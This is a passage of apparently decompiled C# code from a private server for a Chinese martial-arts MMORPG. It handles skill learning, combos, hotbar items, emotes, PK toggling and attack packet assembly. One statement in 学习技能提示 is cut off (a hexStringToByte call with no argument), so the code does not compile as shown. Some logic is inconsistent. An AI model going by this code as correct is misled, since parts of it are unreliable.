						if (武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 >= value.FLD_武功最高级别)
						{
							武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 = value.FLD_武功最高级别;
							return;
						}
						int num3 = 武功类2.FLD_LEVEL;
						if (武功类2.FLD_LEVEL <= 1)
						{
							num3 = 0;
						}
						int num4 = 武功类2.FLD_NEEDEXP + 武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
						int num5 = num3 + 武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 * value.FLD_每级加修炼等级;
						int num6 = 武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 * value.FLD_每级武功点数;
						if (武功类2.FLD_PID == 1000501)
						{
							if (武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 == 2)
							{
								num4 = 250000;
							}
						}
						else if (武功类2.FLD_PID == 1000402)
						{
							if (武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 == 2)
							{
								num4 = 5000;
							}
							else if (武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 == 3)
							{
								num4 = 50000;
							}
						}
						else if (武功类2.FLD_PID == 1000401)
						{
							if (武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 == 1)
							{
								num4 = 200;
							}
							else if (武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 == 2)
							{
								num4 = 1000;
							}
						}
						else if (武功类2.FLD_PID == 1000109)
						{
							if (武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 == 1)
							{
								num4 = 0;
							}
						}
						else if (武功类2.FLD_PID == 1000106)
						{
							num4 -= 50;
							if (num4 < 0)
							{
								num4 = 0;
							}
						}
						else if (武功类2.FLD_PID == 2030101)
						{
							if (武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 == 1)
							{
								num5 = 115;
							}
							else if (武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 == 2)
							{
								num5 = 119;
							}
							num4 = 100000 + 武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
						}
						else if (武功类2.FLD_PID == 2030102)
						{
							num4 = 130000 + 武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
						}
						else if (武功类2.FLD_PID == 2030103)
						{
							num4 = 160000 + 武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
						}
						else if (武功类2.FLD_PID == 2030201)
						{
							num4 = 100000 + 武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
						}
						else if (武功类2.FLD_PID == 2030202)
						{
							num4 = 130000 + 武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
						}
						else if (武功类2.FLD_PID == 2030203)
						{
							num4 = 160000 + 武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 * value.FLD_每级加历练;
						}
						if (base.Player_Level < num5)
						{
							系统提示("人物等级达到" + num5 + "级, 才能修炼。");
							return;
						}
						if (base.Player_ExpErience < num4)
						{
							系统提示("人物历练达到" + 武功类2.FLD_NEEDEXP + ", 才能修炼。");
							return;
						}
						if (升天武功点数 < num6)
						{
							系统提示("升天武功点数不够, 不能修炼。");
							return;
						}
						base.Player_ExpErience -= num4;
						升天武功点数 -= num6;
						武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级++;
					}
				}
				else
				{
					武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX] = 武功类2;
					base.Player_ExpErience -= value.FLD_NEEDEXP;
				}
				更新经验和历练();
				更新武功和状态();
				学习技能提示();
			}
			else if (num == base.人物灵兽全服ID && World.TBL_KONGFU.TryGetValue(num2, out value2))
			{
				武功类 武功类3 = new 武功类(num2);
				if (base.Player_ExpErience < 武功类3.FLD_NEEDEXP)
				{
					系统提示("历练不够, 不能修炼。");
					return;
				}
				人物灵兽.武功新[武功类3.FLD_武功类型, 武功类3.FLD_INDEX] = 武功类3;
				base.Player_ExpErience -= 武功类3.FLD_NEEDEXP;
				更新灵兽武功和状态();
				学习技能提示();
				更新经验和历练();
			}
		}

		private void 学习神女技能(byte[] data, int length)
		{
			int num = BitConverter.ToInt32(data, 10);
			if (!World.TBL_KONGFU.TryGetValue(num, out var value) || value.FLD_武功类型 != 1)
			{
				return;
			}
			try
			{
				if (武功新[1, value.FLD_INDEX] == null)
				{
					武功新[1, value.FLD_INDEX] = new 武功类(num);
				}
				int num2 = ((武功新[1, value.FLD_INDEX].武功_等级 == 0) ? 1 : (武功新[1, value.FLD_INDEX].武功_等级 + value.FLD_每级武功点数));
				if (base.Player_Level < 武功新[1, value.FLD_INDEX].FLD_LEVEL)
				{
					系统提示("等级不足，无法学得该武功。");
					return;
				}
				if (神女武功点数 < num2)
				{
					系统提示("神力点不足，无法学得该武功。");
					return;
				}
				if (武功新[1, value.FLD_INDEX].武功_等级 >= value.FLD_武功最高级别)
				{
					武功新[1, value.FLD_INDEX].武功_等级 = value.FLD_武功最高级别;
					return;
				}
				神女武功点数 -= num2;
				武功新[1, value.FLD_INDEX].武功_等级++;
				更新武功和状态();
			}
			catch
			{
			}
		}

		private void 加升天武功点(byte[] data, int length)
		{
			int num = BitConverter.ToInt32(data, 10);
			if (!World.TBL_KONGFU.TryGetValue(num, out var value) || value.FLD_武功类型 != 3)
			{
				return;
			}
			try
			{
				if ((value.FLD_ZX != 0 && value.FLD_ZX != base.Player_Zx) || value.FLD_JOB != base.Player_Job || value.FLD_JOBLEVEL > base.Player_Job_leve || value.FLD_LEVEL > base.Player_Level)
				{
					return;
				}
				if (武功新[3, value.FLD_INDEX].武功_等级 >= value.FLD_武功最高级别)
				{
					武功新[3, value.FLD_INDEX].武功_等级 = value.FLD_武功最高级别;
					return;
				}
				if (武功新[3, value.FLD_INDEX] == null)
				{
					武功新[3, value.FLD_INDEX] = new 武功类(num);
				}
				int num2;
				int num3;
				if (武功新[3, value.FLD_INDEX].武功_等级 <= 0)
				{
					num2 = value.FLD_NEEDEXP;
					num3 = 0;
				}
				else
				{
					num2 = value.FLD_NEEDEXP + (武功新[3, value.FLD_INDEX].武功_等级 - 1) * value.FLD_每级加历练;
					num3 = 武功新[3, value.FLD_INDEX].武功_等级 * value.FLD_每级武功点数;
				}
				if (base.Player_ExpErience < num2)
				{
					系统提示("人物历练达到" + num2 + ", 才能修炼。");
					return;
				}
				if (升天武功点数 < num3)
				{
					系统提示("升天武功点数不够, 不能修炼。");
					return;
				}
				base.Player_ExpErience -= num2;
				升天武功点数 -= num3;
				武功新[3, value.FLD_INDEX].武功_等级++;
				if (base.Player_Job == 8)
				{
					if (value.FLD_PID == 1030601)
					{
						if (武功新[3, 1] != null && 武功新[3, 1].武功_等级 < 武功新[3, 1].FLD_武功最高级别)
						{
							武功新[3, 1].武功_等级++;
						}
						if (武功新[3, 5] != null && 武功新[3, 5].武功_等级 < 武功新[3, 5].FLD_武功最高级别)
						{
							武功新[3, 5].武功_等级++;
						}
						if (武功新[3, 9] != null && 武功新[3, 9].武功_等级 < 武功新[3, 9].FLD_武功最高级别)
						{
							武功新[3, 9].武功_等级++;
						}
					}
					else if (value.FLD_PID == 1030301)
					{
						if (武功新[3, 1] != null && 武功新[3, 1].武功_等级 < 武功新[3, 1].FLD_武功最高级别)
						{
							武功新[3, 1].武功_等级++;
						}
						if (武功新[3, 5] != null && 武功新[3, 5].武功_等级 < 武功新[3, 5].FLD_武功最高级别)
						{
							武功新[3, 5].武功_等级++;
						}
					}
					else if (value.FLD_PID == 1030201 && 武功新[3, 1] != null && 武功新[3, 1].武功_等级 < 武功新[3, 1].FLD_武功最高级别)
					{
						武功新[3, 1].武功_等级++;
					}
				}
				更新经验和历练();
				更新武功和状态();
			}
			catch
			{
			}
		}

		public void 学习技能(int FLD_武功类型, int FLD_INDEX)
		{
			武功类 wg = 武功类.GetWg(base.Player_Zx, base.Player_Job, FLD_武功类型, FLD_INDEX);
			if (wg != null)
			{
				武功新[wg.FLD_武功类型, wg.FLD_INDEX] = new 武功类(wg.FLD_PID);
				base.Player_ExpErience -= wg.FLD_NEEDEXP;
				学习技能提示();
			}
		}

		public void 假人学习技能(int FLD_武功类型, int FLD_INDEX)
		{
			武功类 wg = 武功类.GetWg2(this, FLD_武功类型, FLD_INDEX);
			if (wg != null)
			{
				武功新[wg.FLD_武功类型, wg.FLD_INDEX] = new 武功类(wg.FLD_PID);
				base.Player_ExpErience -= wg.FLD_NEEDEXP;
				学习技能提示();
			}
		}

		public void 学习技能提示()
		{
			byte[] array = Converter.hexStringToByte
			Buffer.BlockCopy(BitConverter.GetBytes(base.Player_ExpErience), 0, array, 322, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 技能连击(byte[] data, int length)
		{
			int num = data[14];
			byte[] array = Converter.hexStringToByte("AA555200B801C8004C000100000001000000A9360300853C0300863C0300873C030000000000A9360300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(data, 38, array, 38, 16);
			新武功连击.Clear();
			for (int i = 0; i < num; i++)
			{
				List<武功类> list = new List<武功类>();
				byte[] array2 = new byte[4];
				try
				{
					for (int j = 0; j < 3; j++)
					{
						Buffer.BlockCopy(data, j * 4 + 38, array2, 0, 4);
						if (BitConverter.ToInt32(array2, 0) != 0)
						{
							list.Add(new 武功类(BitConverter.ToInt32(array2, 0)));
						}
					}
				}
				catch
				{
				}
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 技能连击2(byte[] data, int length)
		{
			byte[] array = Converter.hexStringToByte("AA555200AF05C3004C00010000000000000000000000853C0300863C0300873C030000000000A9360300AB3603000D37030000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(data, 38, array, 38, 16);
			新武功连击.Clear();
			for (int i = 0; i < 3; i++)
			{
				List<武功类> list = new List<武功类>();
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(data, i * 4 + 38, array2, 0, 4);
				新武功连击.Add(new 武功类(BitConverter.ToInt32(array2, 0)));
				系统提示("武功连击登记成功。");
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 放到快捷栏(byte[] 封包数据, int 封包大小)
		{
			byte[] array = Converter.hexStringToByte("AA551F002C01181010002CDC143C00000000030002000300000000000000000000000055AA");
			byte[] array2 = new byte[4];
			byte[] array3 = new byte[4];
			byte[] array4 = new byte[4];
			byte[] array5 = new byte[4];
			Buffer.BlockCopy(封包数据, 10, array2, 0, 4);
			Buffer.BlockCopy(封包数据, 18, array3, 0, 2);
			Buffer.BlockCopy(封包数据, 20, array4, 0, 2);
			Buffer.BlockCopy(封包数据, 22, array5, 0, 2);
			Buffer.BlockCopy(array2, 0, array, 10, 4);
			int itmeid = Converter.getItmeid(Converter.ToString(array2));
			Buffer.BlockCopy(BitConverter.GetBytes(itmeid), 0, array, 10, 4);
			if (BitConverter.ToInt32(array4, 0) == 2)
			{
				if (itmeid == 1008000044 && 快捷栏.Contains(1008000044))
				{
					base.人物追加最大_HP -= 300;
					if (base.人物_HP > base.人物最大_HP)
					{
						base.人物_HP = base.人物最大_HP;
					}
					快捷栏.Remove(itmeid);
				}
				if (itmeid == 1008000045 && 快捷栏.Contains(1008000045))
				{
					base.人物追加最大_MP -= 200;
					if (base.人物_MP > base.人物最大_MP)
					{
						base.人物_MP = base.人物最大_MP;
					}
					快捷栏.Remove(itmeid);
				}
				if (itmeid == 1008000068 && 快捷栏.Contains(1008000068))
				{
					if (base.人物_HP > base.人物最大_HP)
					{
						base.人物_HP = base.人物最大_HP;
					}
					快捷栏.Remove(itmeid);
				}
				if (itmeid == 1008000069 && 快捷栏.Contains(1008000069))
				{
					if (base.人物_MP > base.人物最大_MP)
					{
						base.人物_MP = base.人物最大_MP;
					}
					快捷栏.Remove(itmeid);
				}
				Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 18, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array, 20, 2);
			}
			else
			{
				if (itmeid == 1008000044 && !快捷栏.Contains(1008000044))
				{
					base.人物追加最大_HP += 300;
					快捷栏.Add(1008000044);
				}
				if (itmeid == 1008000045 && !快捷栏.Contains(1008000045))
				{
					base.人物追加最大_MP += 200;
					快捷栏.Add(1008000045);
				}
				if (itmeid == 1008000068 && !快捷栏.Contains(1008000068))
				{
					快捷栏.Add(1008000068);
				}
				if (itmeid == 1008000069 && !快捷栏.Contains(1008000069))
				{
					快捷栏.Add(1008000069);
				}
				Buffer.BlockCopy(array3, 0, array, 18, 2);
				Buffer.BlockCopy(array4, 0, array, 20, 2);
			}
			Buffer.BlockCopy(array5, 0, array, 22, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			更新HP_MP_SP();
		}

		public void 动作表情(byte[] data, int length)
		{
			if (data[10] >= 1 && data[10] <= 19 && base.人物PK模式 != 0)
			{
				发送打坐数据();
				byte[] 封包数据 = new byte[4] { 1, 0, 0, 0 };
				行走状态id = 1;
				行走状态(封包数据, 1);
				return;
			}
			动作表情(data[10]);
			if (data[10] >= 1 && data[10] <= 4)
			{
				表情次数阀值++;
				if (表情次数阀值 >= 20)
				{
					系统提示("笑锤子笑差不多就行了, 从新上线在笑.", 10, "系统提示");
					RxjhClass.卡号记录(base.Userid, base.UserName, "动态表情", base.Player_Job);
					base.Client.Dispose();
				}
			}
		}

		public void 动作表情(int ID)
		{
			byte[] array = Converter.hexStringToByte("AA550700EE04240001000255AA");
			Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 10, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void PK开关(byte[] data, int length)
		{
			if (base.Player_Level < 35)
			{
				return;
			}
			if (DateTime.Now.Subtract(切换PKtime).TotalSeconds < 2.0)
			{
				switch (base.人物PK模式)
				{
				case 0:
					切换PK模式(0);
					break;
				case 1:
					切换PK模式(1);
					break;
				case 2:
					切换PK模式(2);
					break;
				}
				更新人物数据(this);
				return;
			}
			切换PKtime = DateTime.Now;
			if (base.人物坐标_地图 == 2301)
			{
				if (World.EVEPVP != null && World.Eve90进程 == 3)
				{
					切换PK模式(2);
				}
			}
			else if (base.人物PK模式 == 0)
			{
				切换PK模式(1);
			}
			else if (base.人物PK模式 == 1)
			{
				切换PK模式(2);
			}
			else if (base.人物PK模式 == 2)
			{
				切换PK模式(0);
			}
		}

		public void 发送群攻攻击数据(Players Play, List<群攻击类> 群攻击, int NPC全服ID, int 武功ID, int 攻击力, int 攻击类型, int 宠物攻击力)
		{
			try
			{
				武功类 武功类2 = World.TBL_KONGFU[武功ID];
				Random random = new Random(World.GetRandomSeed());
				using 发包类 发包类 = new 发包类();
				发包类.Write4(NPC全服ID);
				发包类.Write2(武功类2.FLD_DEATHTIME);
				发包类.Write4(群攻击.Count);
				发包类.Write4(武功ID);
				if (Play.Player_Job == 4 && 武功类2.FLD_TYPE == 4 && base.弓群攻触发心神)
				{
					发包类.Write4(136);
					base.弓群攻触发心神 = false;
				}
				else
				{
					发包类.Write4(武功类2.FLD_EFFERT);
				}
				发包类.Write(Play.人物坐标_X);
				发包类.Write(15f);
				发包类.Write(Play.人物坐标_Y);
				for (int i = 0; i < 10; i++)
				{
					发包类.Write4(0);
				}
				if (Play.Player_Job == 4 || Play.Player_Job == 11)
				{
					if (BitConverter.ToInt32(Play.装备栏已穿装备[12].物品ID, 0) != 0)
					{
						int num = BitConverter.ToInt32(Play.装备栏已穿装备[12].物品数量, 0);
						Play.装备栏已穿装备[12].物品数量 = BitConverter.GetBytes(num);
						if (num == 0)
						{
							Play.装备栏已穿装备[12].物品_byte = new byte[World.数据库单个物品大小];
						}
						发包类.Write2(100);
					}
					else
					{
						发包类.Write2(0);
					}
				}
				else if (Play.装备栏已穿装备[12].Get物品数量 > 0)
				{
					发包类.Write2(100);
				}
				else
				{
					发包类.Write2(0);
				}
				发包类.Write2(0);
				using (发包类 发包类2 = new 发包类())
				{
					using 发包类 发包类3 = new 发包类();
					using 发包类 发包类4 = new 发包类();
					using 发包类 发包类5 = new 发包类();
					using 发包类 发包类6 = new 发包类();
					foreach (群攻击类 item in 群攻击)
					{
						发包类2.Write4(item.人物ID);
						发包类3.Write4(item.攻击力);
						发包类4.Write4(item.剩余血量);
						发包类5.Write(群攻击.Count);
						发包类6.Write4(item.总血量);
					}
					for (int j = 0; j < 20 - 群攻击.Count; j++)
					{
						发包类2.Write4(0);
						发包类3.Write4(0);
						发包类4.Write4(0);
						发包类6.Write4(0);
					}
					for (int k = 0; k < 100 - 群攻击.Count; k++)
					{
						if (k >= 58 && k <= 58 + 群攻击.Count)
						{
							if (触发魔法无明暗矢)
							{
								发包类5.Write(100);
								触发魔法无明暗矢 = false;
							}
							else if (触发弓箭致命绝杀)
							{
								发包类5.Write(120);
								触发弓箭致命绝杀 = false;
							}
							else
							{
								发包类5.Write(0);
							}
						}
						else
						{
							发包类5.Write(0);
						}
					}
					byte[] array = 发包类2.ToArray3();
					发包类.Write(array, 0, array.Length);
					byte[] array2 = 发包类3.ToArray3();
					发包类.Write(array2, 0, array2.Length);
					byte[] array3 = 发包类5.ToArray3();
					发包类.Write(array3, 0, array3.Length);
					byte[] array4 = 发包类4.ToArray3();
					发包类.Write(array4, 0, array4.Length);
					byte[] array5 = 发包类6.ToArray3();
					发包类.Write(array5, 0, array5.Length);
				}
				if (宠物攻击力 != -1)
				{
					if (random.Next(0, 100) < 80)
					{
						发包类.Write4(宠物攻击力);
					}
					else
					{
						发包类.Write4(0);
					}
				}
				else
				{
					发包类.Write4(宠物攻击力);
				}
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write(1);
				if (触发流星漫天)
				{
					发包类.Write(1);
				}
				else if (触发杀星义气杀)
				{
					发包类.Write(4);
				}
				else if (触发杀星义气虎)
				{
					发包类.Write(4);
				}
				else
				{
					发包类.Write(0);
				}
				发包类.Write(0);
				发包类.ToArray3();
				if (Play.Client != null)
				{
					Play.Client.SendPak(发包类, 12032, Play.人物全服ID);
				}
				发送当前范围广播数据(发包类, 12032, Play.人物全服ID);
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "发送群攻攻击数据2 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public int 判断拳师连击(int 武功ID)
		{
			if (武功ID == 3000101 || 武功ID == 3000105)
			{
				if (拳师连击控制 == 0)
				{
					拳师连击控制 = 1;
					return 武功ID;
				}
				if (拳师连击控制 == 1)
				{
					拳师连击控制 = 2;
					return 武功ID + 1;
				}
				if (拳师连击控制 == 2)
				{
					拳师连击控制 = 3;
					return 武功ID + 2;
				}
				if (拳师连击控制 == 3)
				{
					拳师连击控制 = 4;
					return 武功ID + 3;
				}
				if (拳师连击控制 == 4)
				{
					拳师连击控制 = 5;
					return 3000109;
				}
				拳师连击控制 = 1;
				return 武功ID;
			}
			拳师连击控制 = 0;
			return 0;
		}

		public void 发送攻击人物数据(Players Play, int 攻击对象人物全服ID, int 武功ID, int 攻击力, int 攻击类型, int 最后血量, int 障力吸收, int 宠物攻击力)
		{
			try
			{
				Random random = new Random(World.GetRandomSeed());
				if (World.TBL_KONGFU.TryGetValue(武功ID, out var value))
				{
					using (发包类 发包类 = new 发包类())
					{
						发包类.Write4(攻击对象人物全服ID);
						发包类.Write2(1);
						if (Play.Player_Job != 4 && Play.Player_Job != 11)
						{
							if (装备栏已穿装备[12].Get物品数量 > 0)
							{
								发包类.Write2(100);
							}
							else if (武功ID == 3000401)
							{
								发包类.Write2(0);
							}
							else if (value.FLD_武功类型 == 1 && Play.人物全服ID == 攻击对象人物全服ID)
							{
								发包类.Write2(0);
							}
							else
							{
								发包类.Write2(武功ID);
							}
						}
						else
						{
							发包类.Write2(100);
						}
						if (武功ID == 3000401)
						{
							发包类.Write4(0);
						}
						else
						{
							发包类.Write4(攻击力);
						}
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(障力吸收);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(武功ID);
						if (Play.Player_Job == 4 && value.FLD_TYPE == 4 && base.弓群攻触发心神)
						{
							发包类.Write4(136);
							base.弓群攻触发心神 = false;
						}
						else
						{
							发包类.Write4(value.FLD_EFFERT);
						}
						发包类.Write(Play.人物坐标_X);
						发包类.Write(15f);
						发包类.Write(Play.人物坐标_Y);
						if (武功ID == 3000401)
						{
							if (攻击对象人物全服ID > 10000)
							{
								发包类.Write(4);
							}
							else
							{
								发包类.Write(0);
							}
						}
						else
						{
							发包类.Write(value.FLD_武功类型);
						}
						if (武功ID == 3000401)
						{
							if (攻击对象人物全服ID > 10000)
							{
								发包类.Write(1);
							}
							else
							{
								发包类.Write(0);
							}
						}
						else
						{
							发包类.Write(1);
						}
						发包类.Write(0);
						发包类.Write4(最后血量);
						if (武功ID == 3000401)
						{
							发包类.Write4(0);
						}
						else if (攻击力 < 1)
						{
							发包类.Write4(1);
						}
						else
						{
							发包类.Write4(0);
						}
						发包类.Write(0);
						if (攻击对象人物全服ID > 10000)
						{
							if (宠物攻击力 != -1)
							{
								if (random.Next(0, 100) < 80)
								{
									发包类.Write4(宠物攻击力);
								}
								else
								{
									发包类.Write4(0);
								}
							}
							else
							{
								发包类.Write4(宠物攻击力);
							}
						}
						else
						{
							发包类.Write4(-1);
						}
						if (base.Player_Job == 9)
						{
							if (攻击力 >= 1 && value.FLD_武功类型 != 2)
							{
								double num = RNG.Next(0, 120);
								if (攻击对象人物全服ID > 10000)
								{
									发包类.Write4(0);
								}
								else if (base.谭_纵横无双 > 0.0)
								{
									if (num <= base.谭_连环飞舞 + base.谭_纵横无双)
									{
										显示大字(base.人物全服ID, 272);
										int num2 = RNG.Next(2, 6);
										if (num2 > 2)
										{
											触发天地回流 = true;
											发包类.Write4(3);
										}
										else
										{
											触发缩影步 = true;
											发包类.Write4(num2);
										}
									}
									else
									{
										发包类.Write4(0);
									}
								}
								else
								{
									发包类.Write4(0);
								}
							}
							else
							{
								发包类.Write4(0);
							}
						}
						else
						{
							发包类.Write4(0);
						}
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						if (武功ID == 3000401)
						{
							发包类.Write4(1);
						}
						else
						{
							发包类.Write4(拳师连击控制);
						}
						if (Play.Client != null)
						{
							Play.Client.SendPak(发包类, 2560, Play.人物全服ID);
						}
						发送当前范围广播数据(发包类, 2560, Play.人物全服ID);
					}
					return;
				}
				int value2 = 1;
				int num3 = 攻击力;
				int num4 = 0;
				int num5 = 0;
				int num6 = 0;
				int value3 = 0;
				switch (攻击类型)
				{
				default:
					if (Play.Player_Job == 6)
					{
						num3 = 0;
						num4 = 0;
						if (攻击力 != 0)
						{
							num3 = new Random().Next(攻击力 / 2 - 10, 攻击力 / 2 + 10);
							num4 = 攻击力 - num3;
						}
						value2 = 2;
					}
					break;
				case 130:
				case 131:
				case 132:
				case 133:
					if (攻击力 != 0)
					{
						Random random4 = new Random();
						num3 = random4.Next(攻击力 / 5 - 10, 攻击力 / 5 + 10);
						num4 = random4.Next((攻击力 - num3) / 4 - 10, (攻击力 - num3) / 4 + 10);
						num5 = random4.Next((攻击力 - num3 - num4) / 3 - 10, (攻击力 - num3 - num4) / 3 + 10);
						num6 = random4.Next((攻击力 - num3 - num4 - num5) / 2 - 10, (攻击力 - num3 - num4 - num5) / 2 + 10);
						value3 = 攻击力 - num3 - num4 - num5 - num6;
						value2 = 5;
					}
					break;
				case 128:
				case 129:
					if (Play.Player_Job == 6)
					{
						if (攻击力 != 0)
						{
							Random random2 = new Random();
							num3 = random2.Next(攻击力 / 5 - 10, 攻击力 / 5 + 10);
							num4 = random2.Next((攻击力 - num3) / 4 - 10, (攻击力 - num3) / 4 + 10);
							num5 = random2.Next((攻击力 - num3 - num4) / 3 - 10, (攻击力 - num3 - num4) / 3 + 10);
							num6 = random2.Next((攻击力 - num3 - num4 - num5) / 2 - 10, (攻击力 - num3 - num4 - num5) / 2 + 10);
							value3 = 攻击力 - num3 - num4 - num5 - num6;
							value2 = 5;
						}
					}
					else
					{
						Random random3 = new Random();
						num3 = random3.Next(攻击力 / 3 - 10, 攻击力 / 3 + 10);
						num4 = random3.Next((攻击力 - num3) / 2 - 10, (攻击力 - num3) / 2 + 10);
						num5 = 攻击力 - num3 - num4;
						value2 = 3;
					}
					break;
				}
				using 发包类 发包类2 = new 发包类();
				int num7 = 1000;
				发包类2.Write4(攻击对象人物全服ID);
				发包类2.Write2(1);
				if (Play.Player_Job != 4 && Play.Player_Job != 11)
				{
					if (Play.装备栏已穿装备[12].Get物品数量 > 0)
					{
						发包类2.Write2(100);
					}
					else
					{
						发包类2.Write2(武功ID);
					}
				}
				else
				{
					发包类2.Write2(100);
				}
				switch (攻击类型)
				{
				case 126:
					num7 = ((base.Player_Job == 3) ? 850 : ((base.Player_Job == 4 || Play.Player_Job == 11) ? 1500 : ((base.Player_Job == 5) ? 850 : ((base.Player_Job != 6) ? 700 : 450))));
					break;
				case 127:
					num7 = ((base.Player_Job == 4 || Play.Player_Job == 11) ? 1500 : ((base.Player_Job == 5) ? 1100 : ((base.Player_Job == 6) ? 450 : ((base.Player_Job != 10) ? 800 : 700))));
					break;
				case 128:
					num7 = ((base.Player_Job == 4 || Play.Player_Job == 11) ? 1500 : 650);
					break;
				case 129:
					num7 = ((base.Player_Job == 3) ? 850 : ((base.Player_Job == 4 || Play.Player_Job == 11) ? 1500 : ((base.Player_Job != 6) ? 600 : 600)));
					break;
				case 130:
					num7 = 650;
					break;
				case 131:
					num7 = ((base.Player_Job != 6) ? 700 : 600);
					break;
				case 132:
					num7 = ((base.Player_Job != 6) ? 700 : 450);
					break;
				case 133:
					num7 = ((base.Player_Job != 6) ? 600 : 450);
					break;
				case 134:
					num7 = ((base.Player_Job == 4 || Play.Player_Job == 11) ? 1700 : ((base.Player_Job != 6) ? 1150 : 850));
					break;
				case 136:
					num7 = 1000;
					break;
				case 113:
					num7 = 500;
					break;
				case 112:
					num7 = 500;
					break;
				}
				发包类2.Write4(num3);
				发包类2.Write4(num4);
				发包类2.Write4(num5);
				发包类2.Write4(num6);
				发包类2.Write4(value3);
				发包类2.Write4(障力吸收);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(武功ID);
				发包类2.Write4(攻击类型);
				发包类2.Write(Play.人物坐标_X);
				发包类2.Write(15f);
				发包类2.Write(Play.人物坐标_Y);
				发包类2.Write(0);
				发包类2.Write(value2);
				发包类2.Write(0);
				发包类2.Write4(最后血量);
				if (攻击力 == 0)
				{
					发包类2.Write4(1);
				}
				else
				{
					发包类2.Write4(0);
				}
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				if (攻击对象人物全服ID > 10000)
				{
					if (宠物攻击力 != -1)
					{
						if (random.Next(0, 100) < 80)
						{
							发包类2.Write4(宠物攻击力);
						}
						else
						{
							发包类2.Write4(0);
						}
					}
					else
					{
						发包类2.Write4(宠物攻击力);
					}
				}
				else
				{
					发包类2.Write4(-1);
				}
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write4(0);
				发包类2.Write(1);
				发包类2.Write(1);
				发包类2.Write2(当前杀怪数量);
				if (Play.Client != null)
				{
					Play.Client.SendPak(发包类2, 2560, Play.人物全服ID);
				}
				发送当前范围广播数据(发包类2, 2560, Play.人物全服ID);
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "发送攻击人物数据 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 发送灵兽攻击人物数据(Players Play, int 攻击对象人物全服ID, int 武功ID, int 攻击力, int 攻击类型, int 最后血量)
		{
			try
			{
				if (World.TBL_KONGFU.TryGetValue(武功ID, out var value))
				{
					using (发包类 发包类 = new 发包类())
					{
						发包类.Write2(攻击对象人物全服ID);
						发包类.Write2(1);
						发包类.Write2(武功ID);
						发包类.Write2(0);
						发包类.Write4(攻击力);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(0);
						发包类.Write4(武功ID);
						发包类.Write4(value.FLD_EFFERT);
						发包类.Write(Play.人物灵兽.人物坐标_X);
						发包类.Write(15f);
						发包类.Write(Play.人物灵兽.人物坐标_Y);
						发包类.Write(0);
						发包类.Write(1);
						发包类.Write2(0);
